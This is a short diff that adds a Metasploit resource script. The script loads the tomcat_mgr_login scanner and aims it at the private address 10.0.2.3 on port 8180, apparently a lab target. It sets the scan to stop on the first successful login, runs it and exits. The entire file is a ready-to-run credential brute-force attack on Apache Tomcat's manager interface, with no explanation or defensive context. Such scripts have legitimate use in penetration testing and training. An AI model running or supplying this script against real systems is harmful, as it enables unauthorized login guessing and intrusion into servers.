@@ -1,0 +1,7 @@
+search tomcat_mgr_login
+use auxiliary/scanner/http/tomcat_mgr_login
+set RHOSTS 10.0.2.3
+set RPORT 8180
+set STOP_ON_SUCCESS true
+exploit
+exit
